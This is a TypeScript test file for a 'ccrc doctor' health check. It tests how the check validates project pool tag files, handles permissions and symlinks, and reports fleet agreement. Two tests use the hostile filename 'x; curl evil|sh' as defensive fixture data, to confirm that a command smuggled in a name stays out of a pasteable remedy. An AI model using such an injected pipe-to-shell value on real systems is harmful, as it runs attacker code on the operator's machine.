  function tag(home: string, project: string, bytes: string): string {
    const d = join(home, '.cc-sessions', 'pools');
    mkdirSync(d, { recursive: true });
    const p = join(d, project);
    writeFileSync(p, bytes);
    return p;
  }

  /** A project directory under `$HOME/projects`, which is where the check
   *  looks for one — the same spelling `_check_graphify` uses (`:2764`). */
  const project = (home: string, name: string): void => {
    mkdirSync(join(home, 'projects', name), { recursive: true });
  };

  /** The roster projection ccd obeys, so the orphan arm has a pool vocabulary
   *  to measure against. Generated, never hand-written — a fixture accounts.sh
   *  typed out here would be a copy of the roster deciding what the check
   *  believes. */
  const pooledRoster = (home: string): void => seedAccountsSh(home, POOLED_TEST_ROSTER);

  it('PASSES with no pools directory at all — nothing is tagged, nothing is constrained', () => {
    const home = healthy('ccrc-doctor-pools-none-');
    const line = lineFor(runDoctor(home).stdout, 'pools');
    expect(line).toMatch(/^PASS pools: /);
    expect(line).toContain('no project pools tagged');
  });

  it('PASSES on a tagged, coherent box — one line, no remedy', () => {
    const home = healthy('ccrc-doctor-pools-ok-');
    pooledRoster(home);
    project(home, 'demo');
    tag(home, 'demo', 'pool-a');
    const out = runDoctor(home).stdout;
    expect(lineFor(out, 'pools')).toMatch(/^PASS pools: /);
    expect(out.split('\n').filter((l) => / pools: /.test(l))).toHaveLength(1);
  });

  it('FAILS pools-malformed with its own remedy, and names the file', () => {
    const home = healthy('ccrc-doctor-pools-malformed-');
    pooledRoster(home);
    project(home, 'demo');
    tag(home, 'demo', 'Pool a');
    const lines = runDoctor(home).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL pools: ') && l.includes('pools-malformed'));
    expect(i, `no pools-malformed line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
    expect(lines[i]).toContain('demo');
    expect(lines[i + 1]).toMatch(/^ {2}remedy: \S/);
  });

  it('WARNS pools-stale for a tag whose project and registry rows are both gone', () => {
    const home = healthy('ccrc-doctor-pools-stale-');
    pooledRoster(home);
    tag(home, 'quiet-basin', 'pool-a');   // no projects/quiet-basin, no *.project row
    const lines = runDoctor(home).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('WARN pools: ') && l.includes('pools-stale'));
    expect(i, `no pools-stale line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
    // The remedy is the verb, and the verb's `--clear` arm is existence-free
    // precisely so this remedy always works.
    expect(lines[i + 1]).toContain('ccd project-pool --project quiet-basin --clear');
  });

  it('does NOT call a registry-only project stale', () => {
    // The `--pool` arm accepts a project that exists only as a registry row;
    // the doctor must use the same two-way test, or it reports every
    // custom-workdir project as stale.
    const home = healthy('ccrc-doctor-pools-regonly-');
    pooledRoster(home);
    mkdirSync(join(home, '.cc-sessions'), { recursive: true });
    writeFileSync(join(home, '.cc-sessions', 'claude-quiet-basin.project'), 'quiet-basin');
    tag(home, 'quiet-basin', 'pool-a');
    expect(lineFor(runDoctor(home).stdout, 'pools')).toMatch(/^PASS pools: /);
  });

  it('WARNS pools-orphan-pool when no rostered account carries the name', () => {
    const home = healthy('ccrc-doctor-pools-orphan-');
    pooledRoster(home);
    project(home, 'demo');
    tag(home, 'demo', 'pool-c');          // no account in POOLED_TEST_ROSTER carries it
    const lines = runDoctor(home).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('WARN pools: ') && l.includes('pools-orphan-pool'));
    expect(i, `no pools-orphan-pool line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
    expect(lines[i + 1]).toMatch(/^ {2}remedy: \S/);
  });

  it('WARNS pools-tmp-leak for a dot-leading entry, with `rm` as the remedy', () => {
    const home = healthy('ccrc-doctor-pools-leak-');
    pooledRoster(home);
    project(home, 'demo');
    tag(home, 'demo', 'pool-a');
    tag(home, '.demo.4242.tmp', 'pool-a');
    const lines = runDoctor(home).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('WARN pools: ') && l.includes('pools-tmp-leak'));
    expect(i, `no pools-tmp-leak line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
    expect(lines[i + 1]).toContain('rm');
  });

  it('FAILS pools-unlistable when a regular file sits where the directory belongs', () => {
    const home = healthy('ccrc-doctor-pools-unlistable-');
    mkdirSync(join(home, '.cc-sessions'), { recursive: true });
    writeFileSync(join(home, '.cc-sessions', 'pools'), 'not a directory\n');
    const lines = runDoctor(home).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL pools: ') && l.includes('pools-unlistable'));
    expect(i, `no pools-unlistable line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
    expect(lines[i + 1]).toMatch(/^ {2}remedy: \S/);
  });

  it.skipIf(process.getuid?.() === 0)(
    'FAILS pools-unreadable for a mode-000 tag, and never calls it untagged', () => {
      const home = healthy('ccrc-doctor-pools-unreadable-');
      pooledRoster(home);
      project(home, 'demo');
      const p = tag(home, 'demo', 'pool-a');
      chmodSync(p, 0o000);
      try {
        const lines = runDoctor(home).stdout.split('\n');
        const i = lines.findIndex((l) => l.startsWith('FAIL pools: ') && l.includes('pools-unreadable'));
        expect(i, `no pools-unreadable line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
        expect(lines[i]).toContain('demo');
      } finally {
        chmodSync(p, 0o600);
      }
    });

  it('FAILS pools-unreadable for a DANGLING SYMLINK at a tag path, never PASS', () => {
    // `-e` is FALSE for a dangling symlink — the same defect `ccd/ccd` fixed
    // twice already (its reader and its writer verb), now a third file. A
    // half-finished `ln -s` after moving a tag must not read as "no tag here".
    const home = healthy('ccrc-doctor-pools-dangling-tag-');
    pooledRoster(home);
    project(home, 'demo');
    const d = join(home, '.cc-sessions', 'pools');
    mkdirSync(d, { recursive: true });
    symlinkSync('/nonexistent-target', join(d, 'demo'));
    const lines = runDoctor(home).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL pools: ') && l.includes('pools-unreadable'));
    expect(i, `no pools-unreadable line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
    expect(lines[i]).toContain('demo');
    expect(lineFor(runDoctor(home).stdout, 'pools')).not.toMatch(/^PASS pools: /);
  });

  it('FAILS pools-unlistable for a DANGLING SYMLINK at pools/ itself, never PASS "no project pools tagged"', () => {
    // The inverse-of-the-truth case: `pools/ -> /nonexistent` must not read as
    // "nothing is tagged, every project is unconstrained" — `ccd` answers
    // `unreadable` for EVERY project on a box shaped like this, so the doctor
    // printing its most reassuring PASS here is the exact opposite of what a
    // half-finished `ln -s` after moving the registry has done.
    const home = healthy('ccrc-doctor-pools-dangling-dir-');
    mkdirSync(join(home, '.cc-sessions'), { recursive: true });
    symlinkSync('/nonexistent-target', join(home, '.cc-sessions', 'pools'));
    const lines = runDoctor(home).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL pools: ') && l.includes('pools-unlistable'));
    expect(i, `no pools-unlistable line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
    expect(lineFor(runDoctor(home).stdout, 'pools')).not.toMatch(/^PASS pools: /);
  });

  it.skipIf(process.getuid?.() === 0)(
    'FAILS pools-unlistable when the REGISTRY cannot be searched, never PASS "no project pools tagged"', () => {
      // THE PARENT'S BLIND SPOT, not the tag's. `-e` and `-L` on
      // `~/.cc-sessions/pools` are BOTH false when `~/.cc-sessions` itself is
      // mode 000 — neither predicate can stat OR lstat through a directory it
      // may not search — so the absence branch fires and the doctor prints its
      // most reassuring PASS on a box where `ccd`'s own reader answers
      // `unreadable` for EVERY project (measured: `_project_pool_state demo`
      // -> `unreadable`) and every placement REFUSES. Pairing `-e` with `-L`
      // (D-1848) does not close this one; only a searchability test on the
      // PARENT does. Skipped as root: root searches any directory, so the
      // fixture cannot be built.
      const home = healthy('ccrc-doctor-pools-reg-unsearchable-');
      pooledRoster(home);
      project(home, 'demo');
      tag(home, 'demo', 'pool-a');
      const reg = join(home, '.cc-sessions');
      chmodSync(reg, 0o000);
      try {
        const out = runDoctor(home).stdout;
        const lines = out.split('\n');
        const i = lines.findIndex((l) => l.startsWith('FAIL pools: ') && l.includes('pools-unlistable'));
        expect(i, `no pools-unlistable line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
        expect(lines[i]).toContain(reg);
        expect(lines[i + 1]).toMatch(/^ {2}remedy: \S/);
        expect(lineFor(out, 'pools')).not.toMatch(/^PASS pools: /);
      } finally {
        chmodSync(reg, 0o755);
      }
    });

  it('still PASSES when the registry is ABSENT — the server box owns no ~/.cc-sessions at all', () => {
    // The other side of the guard above, and the reason it does NOT simply
    // copy `_project_pool_state`'s `[[ -d "$REG" && -x "$REG" ]]`: that reader
    // answers `unreadable` for an ABSENT `$REG` too, on a branch its own
    // comment calls unreachable (`ccd` runs `mkdir -p "$REG"` at source time).
    // `ccrc doctor` has no such guarantee — it runs on the server box, which
    // owns no registry at all — and there "nothing is tagged, every project is
    // unconstrained" is measured, not assumed. `healthy()` builds exactly that
    // box: it never creates `~/.cc-sessions`.
    const home = healthy('ccrc-doctor-pools-reg-absent-');
    expect(existsSync(join(home, '.cc-sessions')), 'the fixture is not the no-registry box').toBe(false);
    const line = lineFor(runDoctor(home).stdout, 'pools');
    expect(line).toMatch(/^PASS pools: /);
    expect(line).toContain('no project pools tagged');
  });

  it('FAILS pools-malformed for a tag holding an embedded NUL byte, and leaks no warning to stderr', () => {
    // Bash DROPS a NUL wherever it lands in a variable, so `$(< "$f")` spliced
    // `pool-\0a` into the legal-looking token `pool-a` and the check PASSED
    // "every project tag … is one legal pool name" — while the command
    // substitution ALSO printed `warning: command substitution: ignored null
    // byte in input` straight to the operator's stderr. `ccd`'s reader answers
    // `malformed` for this file. The only builtin that can SEE the NUL is
    // `read -d ''`, whose exit status distinguishes "found a delimiter" from
    // "hit EOF" — which is what the check now uses, so both halves are fixed
    // by one change.
    const home = healthy('ccrc-doctor-pools-nul-');
    pooledRoster(home);
    project(home, 'demo');
    tag(home, 'demo', 'pool-\u0000a');
    const r = runDoctor(home);
    const lines = r.stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL pools: ') && l.includes('pools-malformed'));
    expect(i, `no pools-malformed line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
    expect(lines[i]).toContain('demo');
    expect(r.stderr).not.toContain('null byte');
    expect(r.stderr).toBe('');
  });

  it('gives each class its OWN line and its OWN remedy, never one joined verdict', () => {
    // Two classes with two different remedies on one box: `pools-malformed` is
    // "rewrite the file", `pools-stale` is "clear the tag". Joining them hands
    // one finding the other's instruction, the collapse `_check_wrappers` was
    // split for.
    const home = healthy('ccrc-doctor-pools-two-');
    pooledRoster(home);
    project(home, 'demo');
    tag(home, 'demo', 'Pool a');
    tag(home, 'quiet-basin', 'pool-a');
    const lines = runDoctor(home).stdout.split('\n');
    const verdicts = lines.filter((l) => / pools: /.test(l));
    expect(verdicts.length, `expected two pools verdict lines:\n${lines.join('\n')}`).toBe(2);
    for (const v of verdicts) {
      expect(lines[lines.indexOf(v) + 1]).toMatch(/^ {2}remedy: \S/);
    }
  });

  // ── HOW THE `Mutation, measured` NOTES BELOW WERE TAKEN ─────────────────
  // `runDoctor` runs the SHIPPED `ccd/ccrc-doctor-checks` (`installCcrc`
  // symlinks it into the fixture box), so a mutated build cannot be reached
  // through it and the production fix cannot be un-shipped to measure the
  // red. Each note below was therefore taken the way `pool-name-parity.test.ts`
  // runs that same file: the checks file copied to a scratchpad, the ONE guard
  // under test reverted there, and the copy sourced standalone under `set -u`
  // with an empty PATH (`. <copy>; _check_pools`). The replay HOME is minimal
  // — the `pools/` tags, the `projects/` directories and the `accounts.sh`
  // this check reads, and nothing else, since `healthy()`'s other artifacts
  // belong to other checks — so what the replay measures is the VERDICT LINE,
  // the same string these assertions read, and not vitest's own red, which is
  // the one thing a scratchpad copy cannot produce.

  // ── `-r` AND `-x` ARE DIFFERENT QUESTIONS (fix round 7, fold b) ──────────
  // Until this round `_check_pools` folded them into one FAIL
  // (`[ ! -d ] || [ ! -r ] || [ ! -x ]`), so a `pools/` at mode `--x` — every
  // tag reachable, none of them listable — was reported `pools-unlistable: …
  // so no project's tag can be read — ccd reads this same path`, which is
  // false in both halves. The AUTHORITY is `_project_pool_state`
  // (`_project_pool_state`): it stats ONE known path (`$POOLS_DIR/<project>`) and
  // never enumerates, so SEARCH is all it needs and LIST is what only this
  // check needs.
  //
  // Measured against that real reader, on exactly the two fixtures the pair
  // of tests below builds (`. ccd/ccd; _project_pool_state demo`, fixture
  // HOME, one legal tag under `pools/`):
  //     pools/ at 0111 (searchable, not listable) -> `named pool-a`
  //     pools/ at 0444 (listable, not searchable) -> `unreadable`
  // The doctor now agrees with the authority in both directions, and these
  // two tests are one pin each on one of those directions.
  it.skipIf(process.getuid?.() === 0)(
    'WARNS pools-unenumerable, never FAILS, for a pools/ that is searchable but not listable', () => {
      // The direction the fold got WRONG. `ccd` places work for this box
      // perfectly; the only thing broken is this check's own eyesight, so the
      // class has to be the one whose CLAIM is "everything works, nobody can
      // audit it" — a separate word from `pools-unlistable`, not a softer
      // tone on the same one.
      //
      // Mutation, measured: `ccd/ccrc-doctor-checks` copied to the scratchpad
      // with the split reverted (the FAIL test back to `[ ! -d "$dir" ] ||
      // [ ! -r "$dir" ] || [ ! -x "$dir" ]` and the `pools-unenumerable` WARN
      // block deleted) answers this fixture `FAIL pools: pools-unlistable: …`
      // — so all three assertions below red on that copy and pass on the tree.
      //
      // Skipped as root: root searches and lists any directory, so the
      // fixture cannot be built — the same reason the mode-000 cases above
      // skip.
      const home = healthy('ccrc-doctor-pools-unenumerable-');
      pooledRoster(home);
      project(home, 'demo');
      tag(home, 'demo', 'pool-a');
      const d = join(home, '.cc-sessions', 'pools');
      chmodSync(d, 0o111);
      try {
        const out = runDoctor(home).stdout;
        const line = lineFor(out, 'pools');
        expect(line, `no pools verdict line:\n${out}`).toMatch(/^WARN pools: /);
        expect(line).toContain('pools-unenumerable');
        // The old verdict, by name: a doctor that FAILs a box `ccd` is happy
        // with is the cross-file disagreement this whole wave keeps finding,
        // pointed at itself.
        expect(out).not.toContain('pools-unlistable');
      } finally {
        chmodSync(d, 0o755);
      }
    });

  it.skipIf(process.getuid?.() === 0)(
    'still FAILS pools-unlistable for a pools/ that is listable but not searchable', () => {
      // The direction the split must NOT have cost. `-r` alone becoming a
      // WARN is only correct because `-x` is still a FAIL on its own: at 0444
      // the reader answers `unreadable` for EVERY project (measured, above),
      // so this is the verdict that agrees with it.
      //
      // Mutation, measured: this test does NOT detect the reverted fold —
      // that copy FAILs `pools-unlistable` here too, exactly as the tree does,
      // and says nothing this assertion can see. What it DOES detect is the
      // split going one step too far: a scratchpad copy whose FAIL test lost
      // its `-x` arm (`if [ ! -d "$dir" ]; then`) answers this same fixture
      // `PASS pools: every project tag … is one legal pool name, names a
      // project that exists, and names a pool this box's roster carries` —
      // the THREE-clause sentence, because this fixture calls `pooledRoster`
      // (an earlier draft of this note quoted the roster-less branch's
      // opening instead, which this fixture cannot produce; re-measured
      // through vitest's own AssertionError) — because a 0444 directory globs fine and then
      // every `[ -e "$f" ]` inside it is false — the most reassuring PASS this
      // check has, on a box where no placement decision can be made at all.
      // That copy reds both assertions below.
      const home = healthy('ccrc-doctor-pools-unsearchable-');
      pooledRoster(home);
      project(home, 'demo');
      tag(home, 'demo', 'pool-a');
      const d = join(home, '.cc-sessions', 'pools');
      chmodSync(d, 0o444);
      try {
        const out = runDoctor(home).stdout;
        const line = lineFor(out, 'pools');
        expect(line, `no pools verdict line:\n${out}`).toMatch(/^FAIL pools: /);
        expect(line).toContain('pools-unlistable');
      } finally {
        chmodSync(d, 0o755);
      }
    });

  // ── A PASS MAY NOT CLAIM A CHECK IT SKIPPED (fix round 7, fold a) ────────
  // The orphan arm measures a tag's pool against `~/.ccrc/accounts.sh`, the
  // generated roster projection — and when that file cannot be read it makes
  // NO claim (`known` stays empty). NOTHING ELSE IN THE DOCTOR REPORTS THAT
  // FILE, which an earlier draft of this comment and of the production
  // sentence both got wrong: `_check_wrappers` holds zero occurrences of
  // `accounts.sh` and reads `accounts.json`, answering PASS on a box with the
  // JSON and no projection, and `_check_graphify` sources the projection when
  // it can and silently skips when it cannot. Measured on a full `ccrc
  // doctor` run over exactly this shape: the only line naming `accounts.sh`
  // is the pools PASS itself. The single PASS sentence that stood here
  // asserted the third clause, "names a pool this box's roster carries",
  // regardless — a PASS reporting a check that never ran, which is the same
  // false-PASS shape the `$reg`-unsearchable guard above was written for.
  //
  // MEASURED, NOT ASSUMED, about the fixture: `healthy()` writes
  // `~/.ccrc/accounts.json` (`writeRoster`) and NEVER `~/.ccrc/accounts.sh` —
  // its own comment says so and the assertion below re-measures it, so this
  // test needs nothing removed or chmod-ed, only `pooledRoster` not called.
  it('PASSES without claiming the roster half when ~/.ccrc/accounts.sh is ABSENT', () => {
    // ABSENT is what this fixture measures, and the title says so. Production
    // gates on `[ -r … ]`, which collapses absent and present-but-unreadable
    // deliberately — one condition, one answer — so a mode-000 projection is
    // NOT exercised here and this test makes no claim about it.
    // Mutation, measured: a scratchpad copy whose final PASS is the single
    // pre-fix sentence answers this fixture `PASS pools: … , names a project
    // that exists, and names a pool this box's roster carries` — which reds
    // the last two of the three assertions below (the `PASS pools: ` one
    // stays green on that copy, which is the whole defect: it is still a
    // PASS, it just reports a check that never ran).
    const home = healthy('ccrc-doctor-pools-no-vocab-');
    expect(existsSync(join(home, '.ccrc', 'accounts.sh')),
      'the fixture is not the no-roster-projection box').toBe(false);
    project(home, 'demo');
    tag(home, 'demo', 'pool-a');
    const line = lineFor(runDoctor(home).stdout, 'pools');
    expect(line).toMatch(/^PASS pools: /);
    expect(line).toContain('the pool-vocabulary half is UNMEASURED');
    expect(line).not.toContain("names a pool this box's roster carries");
  });

  it('says the roster carries NO POOLS when the projection reads fine and no account is tagged', () => {
    // THE STATE THAT IS EVERY BOX ON THE FLEET TODAY, and the one the first
    // version of this fix reported as "could not be read". `known` is empty
    // in TWO conditions — the read failed, or it succeeded and nothing is
    // tagged — and only the first is UNMEASURED. `DEFAULT_TEST_ROSTER`
    // carries no `pool` on any account, so `seedAccountsSh` writes a real
    // generated projection whose `_ccrc_pool` case has no arms: readable,
    // parseable, and empty. That is the fixture, and it goes through the
    // generator rather than being hand-written, so the empty-case shape is
    // the one `ccrc install` really emits.
    //
    // Mutation, measured: a scratchpad copy whose closing PASS branches on
    // `[ -n "$known" ]` alone — the two-state shape — answers this fixture
    // with the UNMEASURED sentence, i.e. tells the operator a file it just
    // read could not be read. The third assertion below is the one that reds
    // on it; the first two stay green, which is the whole defect.
    const home = healthy('ccrc-doctor-pools-nopools-');
    seedAccountsSh(home);
    project(home, 'demo');
    tag(home, 'demo', 'pool-a');
    const line = lineFor(runDoctor(home).stdout, 'pools');
    expect(line).toMatch(/^PASS pools: /);
    expect(line).toContain('carries NO pools at all');
    expect(line, 'the projection was readable — saying otherwise is the defect this pins')
      .not.toContain('could not be read');
    expect(line).not.toContain("names a pool this box's roster carries");
  });

  it('DOES claim the roster half when ~/.ccrc/accounts.sh was read', () => {
    // The mirror, and without it the pin above is satisfied by a check that
    // never claims the third clause at all — which would be a doctor that
    // stopped reporting the orphan arm's agreement entirely.
    //
    // Mutation, measured: a scratchpad copy whose final PASS is only the
    // UNMEASURED sentence answers this fixture with it, and this test reds
    // while the one above stays green.
    const home = healthy('ccrc-doctor-pools-vocab-');
    pooledRoster(home);
    project(home, 'demo');
    tag(home, 'demo', 'pool-a');
    const line = lineFor(runDoctor(home).stdout, 'pools');
    expect(line).toMatch(/^PASS pools: /);
    expect(line).toContain("names a pool this box's roster carries");
    expect(line).not.toContain('UNMEASURED');
  });

  // ── A FILESYSTEM-DERIVED NAME MAY NOT RIDE INSIDE A COMMAND ─────────────
  // The `pools-stale` remedy is the exact command an operator is invited to
  // paste, and its `<project>` argument is a FILENAME read off disk. A tag
  // file named `x; curl evil|sh` rendered `remedy: clear each: ccd
  // project-pool --project x; curl evil|sh --clear` — three commands, two of
  // them the filename's. Not an escalation (writing under `pools/` already
  // needs code execution as this user), and that is exactly why it is worth
  // fixing rather than arguing about: this check's whole value is that what
  // it prints can be trusted.
  //
  // THE TWO SURFACES ARE DIFFERENT AND ONLY ONE IS FILTERED. The verdict
  // MESSAGE still names the file — it is printed, never executed, and an
  // operator who cannot see the offending name cannot go delete it. The
  // REMEDY is the one an operator runs, so the charset gate lives there.
  it('keeps a hostile stale FILENAME out of the remedy while still naming it in the verdict', () => {
    // Mutation, measured: a scratchpad copy with the charset gate reverted
    // (every stale name appended to `p_stale_cmds` unfiltered, the omission
    // counter gone) answers this fixture `remedy: clear each: ccd project-pool
    // --project x; curl evil|sh --clear` — which reds the three remedy
    // assertions below (no `curl`, the omission sentence, the count). The
    // `/^ {2}remedy: \S/` shape assertion and BOTH verdict assertions stay
    // green on that copy, which is the point of asserting them: the defect
    // was never a missing line or a missing name.
    const home = healthy('ccrc-doctor-pools-stale-hostile-');
    pooledRoster(home);
    const hostile = 'x; curl evil|sh';
    tag(home, hostile, 'pool-a');   // no projects/<name>, no *.project row
    const lines = runDoctor(home).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('WARN pools: ') && l.includes('pools-stale'));
    expect(i, `no pools-stale line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
    expect(lines[i]).toContain(hostile);
    expect(lines[i + 1]).toMatch(/^ {2}remedy: \S/);
    expect(lines[i + 1]).not.toContain('curl');
    expect(lines[i + 1]).toContain('NOT printed as a command');
    expect(lines[i + 1]).toMatch(/\b1 name/);
  });

  it('still prints the exact clear command for an ordinary stale name on the same box', () => {
    // The companion, and it is not decoration: a gate that omitted EVERY name
    // would satisfy the test above completely while leaving the remedy with
    // no command in it at all — a WARN whose cure is "go work it out". One
    // box, two stale tags, and the remedy has to carry the legal one's exact
    // command AND the count of what it would not print.
    //
    // Mutation, measured: a scratchpad copy whose `case` omits every name
    // (`*) p_stale_omit=$((p_stale_omit + 1)); continue ;;`) answers this
    // fixture `remedy: 2 name(s) are NOT printed as a command: …` with no
    // `ccd project-pool` in it — which reds the first and third assertions
    // below (the count moves to 2 as well), while the `curl` one stays green:
    // omitting everything is safe and useless, and only the command half
    // says so.
    const home = healthy('ccrc-doctor-pools-stale-mixed-');
    pooledRoster(home);
    tag(home, 'x; curl evil|sh', 'pool-a');
    tag(home, 'quiet-basin', 'pool-a');
    const lines = runDoctor(home).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('WARN pools: ') && l.includes('pools-stale'));
    expect(i, `no pools-stale line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
    expect(lines[i + 1]).toContain('ccd project-pool --project quiet-basin --clear');
    expect(lines[i + 1]).not.toContain('curl');
    expect(lines[i + 1]).toMatch(/\b1 name/);
  });

  // ── THE DOCTOR'S OWN SIZE CAP (fix round 7) ──────────────────────────────
  // `read -r -d '' -n 64` is the READER's gate, inherited here for the reason
  // every per-tag arm in this loop is: a doctor that read a tag differently
  // from the file that obeys it reports on a rule nobody enforces. Twice the
  // 32-character grammar, so no legal tag can reach it; without it a
  // `pools/<p>` symlinked at a growing log is slurped whole into a variable
  // by the one tool an operator runs when the box is already sick.
  //
  // THE WHITESPACE PAIR IS WHAT DETECTS THE MUTATION, and a big junk file is
  // NOT — the same fact `ccd`'s own cap test rests on. Measured on a
  // scratchpad copy with `-n 64` removed:
  //     `pool-a` + 100 spaces (106 bytes) -> PASS      (tree: pools-malformed)
  //     `pool-a` +  50 spaces  (56 bytes) -> PASS      (tree: PASS)
  //     1 MB of junk                      -> pools-malformed, WITH AND
  //                                          WITHOUT the cap
  // The junk file answers malformed either way because its bytes are not a
  // pool name whether 64 of them or a million are read. What DOES tell the
  // two builds apart is a file that is LEGAL WHEN READ WHOLE and longer than
  // the cap — trailing whitespace being the cheapest such tail, since the
  // strip would make it legal. Re-measured in the same round, because the
  // sentence that stood here named a different criterion ("first 64 bytes
  // legal, tail not") and was false: `pool-a` + 58 spaces + `!!!` (67 bytes)
  // matches THAT description and answers `pools-malformed` on the tree and on
  // the cap-deleted copy alike, telling the builds apart not at all. Nor does
  // the over-cap row reach the strip or the grammar test: `read -r -d '' -n 64`
  // stops short of EOF, returns 0, and the `p_malformed` bucket in
  // `_check_pools` takes it immediately, before any strip or grammar test.
  it('caps its read: 106 bytes of tag is malformed, 56 bytes is legal', () => {
    // WHAT THIS PAIR IS EVIDENCE FOR, EXACTLY: a cap somewhere in [56, 105].
    // It is not evidence for 64, and it is not evidence that the number is
    // the READER's — a `-n 80` build keeps both halves green (measured), and
    // nothing in this file compares the two literals. The title used to say
    // "applies the reader's 64-byte cap" and measured neither word. The
    // cross-file half is pinned where this repo pins cross-file spellings:
    // `pool-name-parity.test.ts` holds the doctor's `-n` literal equal to
    // `ccd/ccd`'s, alongside the grammar and the directory name.
    //
    // Mutation, measured, in the OTHER direction too: a copy with the cap
    // TIGHTENED to `-n 8` answers the 56-byte fixture `FAIL pools:
    // pools-malformed` — so the second half below is a pin on the cap's
    // value being large enough, not only on its presence.
    const over = healthy('ccrc-doctor-pools-overcap-');
    pooledRoster(over);
    project(over, 'demo');
    tag(over, 'demo', `pool-a${' '.repeat(100)}`);
    const lines = runDoctor(over).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL pools: ') && l.includes('pools-malformed'));
    expect(i, `no pools-malformed line:\n${lines.join('\n')}`).toBeGreaterThan(-1);
    expect(lines[i]).toContain('demo');

    const under = healthy('ccrc-doctor-pools-undercap-');
    pooledRoster(under);
    project(under, 'demo');
    tag(under, 'demo', `pool-a${' '.repeat(50)}`);
    const line = lineFor(runDoctor(under).stdout, 'pools');
    expect(line, 'a 56-byte tag is under the cap and strips to a legal name').toMatch(/^PASS pools: /);
  });
});


// ── the two boxes' matched set ────────────────────────────────────────────
// Task 7. The check asks the SERVER — the only party that can compare the two
// boxes — and reports its answer. It decides nothing about the comparison
// itself: `rosterAgreement`/`buildAgreement` (server/src/fleetstate.ts) own
// that, and both are deliberately THREE-valued, so the whole job here is to
// keep the three apart. `'unknown'` is not disagreement (an older agent, an
// unstamped box), and "there is no server to ask" is not agreement.

describe('ccrc doctor: fleet', () => {
  it('passes when the server says both boxes agree, and names what it measured', () => {
    const home = healthy('ccrc-doctor-fleet-agreed-');
    const r = runDoctor(home);
    const line = lineFor(r.stdout, 'fleet');
    expect(line).toMatch(/^PASS fleet: the two boxes agree/);
    // Never the bare word "ok": the address it asked, and both answers.
    expect(line).toContain(FIXTURE_ADDR);
    expect(r.code).toBe(0);
  });

  it('really asks the server — the stub logs the one URL it was given', () => {
    // Proof the check is not vacuous AND proof of containment in one
    // assertion, the same shape the gh poison gives gh_auth: the only `curl`
    // this suite can reach is the fixture's own, and it saw exactly one URL.
    const home = healthy('ccrc-doctor-fleet-asked-');
    runDoctor(home);
    // The `build` check (Stage 4, Task 9) asks its own ONE question of the
    // same stub — GET /health — so the log is filtered to this check's URL
    // rather than asserted to be the whole log. Still exactly once.
    const calls = curlCalls(home).filter((c) => c.includes('/api/fleet/health'));
    expect(calls.length).toBe(1);
    expect(calls[0]).toContain(`http://${FIXTURE_ADDR}/api/fleet/health`);
  });

  it('fails on a skewed build, and the remedy names the ORDER', () => {
    const home = healthy('ccrc-doctor-fleet-skewed-');
    stubHealth(home, { mode: 'remote', connected: true, build: 'skewed', roster: 'agreed' });
    const r = runDoctor(home);
    expect(r.code).toBe(1);
    expect(r.stdout).toMatch(/FAIL fleet: the two boxes are running different builds/);
    // FLEET BOX FIRST is the whole content of the remedy, and the INSTRUMENT
    // is now `ccrc update` (Stage 4, Task 9 — spec §8): the server reads what
    // the fleet host's hook writes and the agent caches `ccd caps` at boot,
    // so the other order runs a server reading fields nobody writes yet.
    // deploy.sh is the developer lane, not the box's own remedy.
    expect(r.stdout).toMatch(/remedy: run 'ccrc rollout' from the deploying machine.*or 'ccrc update' on the lagging box.*fleet box first/i);
    expect(r.stdout).not.toMatch(/deploy\.sh/);
  });

  it('fails on a divergent roster, in its own words and with its own remedy', () => {
    // Not the build's sentence and not the build's remedy: reconciling two
    // rosters is a different action from deploying a lagging box, and
    // `rosterAgreement`'s own docstring states the order (redeploy both first,
    // reconcile the JSON second).
    const home = healthy('ccrc-doctor-fleet-divergent-');
    stubHealth(home, { mode: 'remote', connected: true, build: 'agreed', roster: 'divergent' });
    const r = runDoctor(home);
    expect(r.code).toBe(1);
    expect(r.stdout).toMatch(/FAIL fleet: the two boxes would run different ~\/\.ccrc\/accounts\.sh/);
    expect(r.stdout).not.toMatch(/running different builds/);
  });

  it('keeps the two disagreements on SEPARATE lines when both are true at once', () => {
    // The merge a tidy-minded reader reaches for — one "the boxes disagree"
    // line — hands one of the two findings the other's remedy. They are two
    // repairs, so they are two lines.
    const home = healthy('ccrc-doctor-fleet-both-bad-');
    stubHealth(home, { mode: 'remote', connected: true, build: 'skewed', roster: 'divergent' });
    const r = runDoctor(home);
    const lines = r.stdout.split('\n');
    const b = lines.findIndex((l) => l.startsWith('FAIL fleet: the two boxes are running different builds'));
    const s = lines.findIndex((l) => l.startsWith('FAIL fleet: the two boxes would run different ~/.ccrc/accounts.sh'));
    expect(b, r.stdout).toBeGreaterThan(-1);
    expect(s, r.stdout).toBeGreaterThan(-1);
    expect(b).not.toBe(s);
    expect(lines[b + 1]).toMatch(/^ {2}remedy: \S/);
    expect(lines[s + 1]).toMatch(/^ {2}remedy: \S/);
    expect(lines[b + 1]).not.toBe(lines[s + 1]);
    expect(r.code).toBe(1);
  });

  it('only warns on unknown — an older agent is not a broken fleet', () => {
    const home = healthy('ccrc-doctor-fleet-unknown-');
    stubHealth(home, { mode: 'remote', connected: true, build: 'unknown', roster: 'agreed' });
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^WARN fleet: /m);
